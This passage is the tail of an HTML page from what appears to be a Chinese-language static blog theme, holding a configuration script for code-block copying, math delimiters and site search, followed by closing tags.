defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
